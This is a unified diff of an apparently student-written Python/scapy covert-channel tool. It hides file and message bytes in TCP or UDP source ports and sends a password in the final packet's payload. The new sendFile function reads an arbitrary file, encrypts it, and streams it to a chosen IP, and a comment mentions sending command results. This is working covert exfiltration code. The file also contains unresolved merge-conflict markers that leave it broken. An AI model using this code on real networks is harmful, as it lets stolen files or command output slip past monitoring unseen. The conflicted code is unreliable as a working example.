@@ -1,47 +1,40 @@
-from scapy.all import *
-import binascii, time
+<<<<<<< HEAD
+import binascii, time, os, ntpath, encryption, configfile, logging
+=======
+import binascii, time, os, logging
+>>>>>>> 30b3bebd64668234701cf28ae5b4c77fca846edd
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
 
 maxPort = 65535
+# lastPosition = 0
+# fileSize = 0
 
 # take string and break it into chunks of length size
 def chunkString(size, string):
   chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
   return chunkedString
 
-def createPacketTwo(protocol, ip, char1, char2):
+def createPacketTwo(protocol, ip, char1, char2, port):
     # get the binary values of both chars without the binary string indicator
     binChar1 = bin(ord(char1))[2:].zfill(8)
     binChar2 = bin(ord(char2))[2:].zfill(8)
-    print binChar1 + binChar2
+    # print binChar1 + binChar2
     # get the integer value of the concatenated binary values
     intPortVal = int(binChar1 + binChar2, 2)
-    print "bin value " + str((bin(intPortVal)))
+    #print "bin value " + str((bin(intPortVal)))
     # craft the packet
     if protocol == 'tcp':
-        packet = IP(dst=ip)/TCP(dport=8000, sport=maxPort - intPortVal)
+        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
     elif protocol == 'udp':
-        packet = IP(dst=ip)/UDP(dport=8000, sport=maxPort - intPortVal)
+        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
     return packet
 
 # create a packet when we only have 1 character remaining in the file
 # works exactly the same as createPacketTwo except we only have one character
 # returns a TCP packet created by scapy.
-def createPacketOne(protocol, ip, char):
-    # get the binary value of the character
-    binChar = bin(ord(char))[2:].zfill(8)
-    #print binChar
-    #get the integer value of that binary value
-    intPortVal = int(binChar, 2)
-    # craft the packet
-    if protocol == 'tcp':
-        packet = IP(dst=ip)/TCP(dport=8000, sport=maxPort - intPortVal)
-    elif protocol == 'udp':
-        packet = IP(dst=ip)/UDP(dport=8000, sport=maxPort - intPortVal)
-    return packet
 
-# create a packet containing one character hidden in the source port
-def createPacket(protocol, ip, char, port):
+def createPacketOne(protocol, ip, char, port):
     # get the binary value of the character
     binChar = bin(ord(char))[2:].zfill(8)
     #print binChar
@@ -76,28 +69,44 @@ def parsePacket(packet):
         #print "Received: " + char
         return str(char)
 
-# open a file in binary mode and return a string of the binary data
-def sendFile(ip, filePath, protocol, port):
-  try: # read the file byte by byte rather than reading the entire file into memory
-    with open(filePath, 'rb') as fileDescriptor:
-      while True:
-        byte = fileDescriptor.read(1)
-        if not byte:
-          break
-        # we need the '1' + ... because python will trim the leading character if it's a zero
-        byte = bin(int('1' + binascii.hexlify(bytes), 16))[3:].zfill(8)
-        # send to IP address here
-        packet = createPacket(protocol, ip, byte, port)
-        send(packet, verbose=0)
-  except IOError:
-    print "file error"
-
 # we should pass the encrypted password + string (command results or something else)
 def sendMessage(message, password, protocol, ip, port):
   lastIndex = len(message) - 1
   for index, char in enumerate(message):
-    packet = createPacket(protocol, ip, char, port)
+    packet = createPacketOne(protocol, ip, char, port)
     if index ==  lastIndex:
       packet = packet/Raw(load=password)
     send(packet, verbose=0)
     time.sleep(0.1) # we should check if this is actually necessary
+
+def readOneByte(fileDescriptor):
+    global lastPosition
+    fileDescriptor.seek(lastPosition)
+    byte = fileDescriptor.read(1)
+    lastPosition = fileDescriptor.tell()
+    return byte
+
+# def sendFile(ip, filePath, protocol, port, password):
+#     global lastPosition
+#     global fileSize
+#     fileSize = os.path.getsize(filePath)
+#     fileDescriptor = open(filePath, 'rb')
+#     while lastPosition < fileSize:
+#         if lastPosition == fileSize -1:
+#             char = readOneByte(fileDescriptor)
+#             packet = createPacketOne(protocol, ip, char, port)
+#         else:
+#             char1 = readOneByte(fileDescriptor)
+#             char2 = readOneByte(fileDescriptor)
+#             packet = createPacketTwo(protocol, ip, char1, char2, port)
+#         if lastPosition == fileSize:
+#             packet = packet/Raw(load=password)
+#         send(packet, verbose = 0)
+#         time.sleep(0.5)
+
+def sendFile(ip, filePath, protocol, port, password):
+    fileDescriptor = open(filePath, 'rb')
+    header = ntpath.basename(filePath) + '\0'
+    data = header + fileDescriptor.read()
+    encryptedData = encryption.encrypt(data, configfile.masterkey)
+    sendMessage(encryptedData, password, protocol, ip, port)
